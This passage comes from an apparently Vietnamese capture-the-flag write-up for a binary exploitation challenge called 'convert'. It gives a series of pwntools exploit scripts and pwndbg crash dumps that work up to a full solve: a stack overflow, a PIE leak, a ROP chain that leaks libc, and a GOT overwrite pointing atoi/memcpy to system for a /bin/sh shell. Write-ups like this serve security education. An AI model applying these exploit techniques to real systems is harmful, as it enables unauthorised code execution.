+</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">0.01</span>)
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ada</span>
+</span></span><span style="display:flex;"><span>print(hex(elf<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;e&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Ở đây mình có <code>0x30*5 = 0xf0</code> bytes, là đủ để ghi đè return address. Nhưng khi mình chạy thử thì:</p>
+<pre tabindex="0"><code>pwndbg&gt; 
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555555519 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
+ RAX  0x6363636363636363 (&#39;cccccccc&#39;)
+ RBX  0x0
+ RCX  0x7fffffffde40 ◂— 0x6363636363636363 (&#39;cccccccc&#39;)
+ RDX  0x30
+ RDI  0x7fffffffde40 ◂— 0x6363636363636363 (&#39;cccccccc&#39;)
+ RSI  0x555555559380 ◂— &#39;cccccccccccccccccccccccccccccccccccccccccccccccc&#39;
+ R8   0x1999999999999999
+ R9   0x555555559440 ◂— &#39;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#39;
+ R10  0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
+ R11  0x7ffff7f96ce0 (main_arena+96) —▸ 0x555555559470 ◂— 0x0
+ R12  0x7fffffffe058 —▸ 0x7fffffffe39f ◂— &#39;./convert&#39;
+ R13  0x555555555ac1 ◂— push   rbp
+ R14  0x0
+ R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+ RBP  0x7fffffffdea0 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf40 ◂— 0x1
+ RSP  0x7fffffffdbf0 ◂— 0x0
+ RIP  0x555555555519 ◂— mov    rax, qword ptr [rax + 0x10]
+───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
+   0x55555555550c    call   memcpy@plt                &lt;memcpy@plt&gt;
+ 
+   0x555555555511    add    dword ptr [rbp - 0x2c], 0x30
+   0x555555555515    mov    rax, qword ptr [rbp - 0x38]
+ ► 0x555555555519    mov    rax, qword ptr [rax + 0x10]
+   0x55555555551d    test   rax, rax
+   0x555555555520    je     0x555555555530                &lt;0x555555555530&gt;
+    ↓
+   0x555555555530    nop    
+   0x555555555531    mov    rax, qword ptr [rbp - 0x2a8]
+   0x555555555538    mov    rax, qword ptr [rax + 8]
+   0x55555555553c    mov    rdi, rax
+   0x55555555553f    call   strlen@plt                &lt;strlen@plt&gt;
+────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdbf0 ◂— 0x0
+01:0008│     0x7fffffffdbf8 —▸ 0x555555559420 ◂— 0x62746800000000
+02:0010│     0x7fffffffdc00 ◂— 0x0
+... ↓        5 skipped
+──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
+ ► f 0   0x555555555519
+   f 1   0x555555555a72
+   f 2   0x555555555b73
+   f 3   0x7ffff7da6d90 __libc_start_call_main+128
+   f 4   0x7ffff7da6e40 __libc_start_main+128
+   f 5   0x55555555510a
+─────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg&gt; 
+</code></pre><p>Chương trình lại crash ngay instruction <code>mov rax, qword ptr [rax + 0x10]</code>. Vậy chuyện gì đã xảy ra? Instruction đó ở ngay câu lệnh <code>if ( !j-&gt;next_data )</code>.</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img10.png" alt="img"  />
+</p>
+<p>Nếu chúng ta xem lại vị trí các biến trong hàm <code>hex_to_bin</code>, thì <code>[rbp-0x38]</code> sẽ là vị trí của <code>j</code>. Có nghĩa là mình đã vô tình ghi đè <code>j</code> thành 1 giá trị rác. Vậy giờ mình chỉ cần thay <code>j</code> thành 1 giá trị hợp lý là được.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_data</span>(ops, mode, data):
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>: str(ops)<span style="color:#f92672">.</span>encode(),
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x4</span>: mode,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x8</span>: data
+</span></span><span style="display:flex;"><span>	}, filler <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">0.01</span>)
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ada</span>
+</span></span><span style="display:flex;"><span>print(hex(elf<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4070</span>))
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;e&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Lần này thì chương trình sẽ crash ngay tại hàm <code>memcpy</code>.</p>
+<pre tabindex="0"><code>──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
+ RAX  0x555555559320 ◂— &#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#39;
+ RBX  0x0
+ RCX  0x800061613f71
+ RDX  0x30
+*RDI  0x800061613f71
+ RSI  0x555555559320 ◂— &#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#39;
+ R8   0x1999999999999999
+ R9   0x555555559440 ◂— &#39;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#39;
+ R10  0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
+ R11  0x7ffff7f96ce0 (main_arena+96) —▸ 0x555555559470 ◂— 0x0
+ R12  0x7fffffffe058 —▸ 0x7fffffffe39f ◂— &#39;./convert&#39;
+ R13  0x555555555ac1 ◂— push   rbp
+ R14  0x0
+ R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+ RBP  0x7fffffffdea0 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf40 ◂— 0x1
+ RSP  0x7fffffffdbf0 ◂— 0x0
+*RIP  0x55555555550c ◂— call   0x555555555090
+───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
+   0x5555555554f7    lea    rcx, [rbp - 0xc0]
+   0x5555555554fe    add    rcx, rdx
+   0x555555555501    mov    edx, 0x30
+   0x555555555506    mov    rsi, rax
+   0x555555555509    mov    rdi, rcx
+ ► 0x55555555550c    call   memcpy@plt                &lt;memcpy@plt&gt;
+        dest: 0x800061613f71
+        src: 0x555555559320 ◂— &#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#39;
+        n: 0x30
+ 
+   0x555555555511    add    dword ptr [rbp - 0x2c], 0x30
+   0x555555555515    mov    rax, qword ptr [rbp - 0x38]
+   0x555555555519    mov    rax, qword ptr [rax + 0x10]
+   0x55555555551d    test   rax, rax
+   0x555555555520    je     0x555555555530                &lt;0x555555555530&gt;
+────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdbf0 ◂— 0x0
+01:0008│     0x7fffffffdbf8 —▸ 0x555555559420 ◂— 0x62746800000000
+02:0010│     0x7fffffffdc00 ◂— 0x0
+... ↓        5 skipped
+──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
+ ► f 0   0x55555555550c
+   f 1   0x555555555a72
+   f 2   0x555555555b73
+   f 3   0x7ffff7da6d90 __libc_start_call_main+128
+   f 4   0x7ffff7da6e40 __libc_start_main+128
+   f 5   0x55555555510a
+─────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg&gt; 
+</code></pre><p>Chương trình crash vì mình cũng đã ghi đè biến <code>idx</code> nằm ở <code>[rbp-0x2c]</code> thành 1 giá trị rác. Vậy mình cũng cần phải chỉnh lại giá trị của <code>idx</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_data</span>(ops, mode, data):
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>: str(ops)<span style="color:#f92672">.</span>encode(),
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x4</span>: mode,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x8</span>: data
+</span></span><span style="display:flex;"><span>	}, filler <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">0.01</span>)
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ada</span>
+</span></span><span style="display:flex;"><span>print(hex(elf<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xc0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x30</span>))
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4070</span>))
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;e&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Lúc này thì mình đã có thể điều khiển được luồng thực thi của chương trình.</p>
+<pre tabindex="0"><code>──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
+ RAX  0x0
+ RBX  0x0
+ RCX  0x7ffff7e91a37 (write+23) ◂— cmp    rax, -0x1000 /* &#39;H=&#39; */
+ RDX  0x1
+ RDI  0x7ffff7f98a70 (_IO_stdfile_1_lock) ◂— 0x0
+ RSI  0x1
+ R8   0x4
+ R9   0x555555559440 ◂— &#39;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#39;
+ R10  0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
+ R11  0x246
+ R12  0x7fffffffe058 —▸ 0x7fffffffe39f ◂— &#39;./convert&#39;
+ R13  0x555555555ac1 ◂— push   rbp
+ R14  0x0
+ R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+ RBP  0x6262626262626262 (&#39;bbbbbbbb&#39;)
+ RSP  0x7fffffffdea8 ◂— &#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc&#39;
+ RIP  0x5555555556aa ◂— ret    
+───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
+   0x555555555685    call   puts@plt                &lt;puts@plt&gt;
+ 
+   0x55555555568a    jmp    0x5555555556a2                &lt;0x5555555556a2&gt;
+    ↓
+   0x5555555556a2    mov    eax, dword ptr [rbp - 0x14]
+   0x5555555556a5    mov    rbx, qword ptr [rbp - 8]
+   0x5555555556a9    leave  
+ ► 0x5555555556aa    ret    &lt;0x6262626262626262&gt;
+
+
+
+────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdea8 ◂— &#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc&#39;
+... ↓        4 skipped
+05:0028│     0x7fffffffded0 ◂— &#39;cccccccc&#39;
+06:0030│     0x7fffffffded8 ◂— 0x0
+07:0038│     0x7fffffffdee0 ◂— 0x0
+──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
+ ► f 0   0x5555555556aa
+   f 1 0x6262626262626262
+   f 2 0x6262626262626262
+   f 3 0x6262626262626262
+   f 4 0x6262626262626262
+   f 5 0x6262626262626262
+   f 6 0x6363636363636363
+   f 7              0x0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg&gt; 
+</code></pre><h2 id="overwrite-got">Overwrite GOT<a hidden class="anchor" aria-hidden="true" href="#overwrite-got">#</a></h2>
+<p>Tới đây thì có nhiều hướng, mình chọn cách leak libc rồi overwrite <code>atoi@GOT</code> thành <code>system</code>.</p>
+<p>Sau khi leak được libc thì mình return về địa chỉ <code>binary base +  0x1aff</code></p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img11.png" alt="img"  />
+</p>
+<p>để ghi đè GOT.</p>
+<h2 id="final-script">Final script<a hidden class="anchor" aria-hidden="true" href="#final-script">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_data</span>(ops, mode, data):
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>: str(ops)<span style="color:#f92672">.</span>encode(),
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x4</span>: mode,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x8</span>: data
+</span></span><span style="display:flex;"><span>	}, filler <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">0.01</span>)
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ada</span>
+</span></span><span style="display:flex;"><span>print(hex(elf<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c0b</span>
+</span></span><span style="display:flex;"><span>pop_rbp_r14_r15 <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c07</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xc0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x30</span>))
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> p64(pop_rbp_r14_r15) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;memcpy&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x50</span>))
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(pop_rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1aff</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4070</span>))
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>send_data(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;htb&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;e&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;malloc&#39;</span>]) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<p>Do lúc mình viết writeup thì server đã đóng nên mình chỉ có thể test lại trên local.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 solve.py
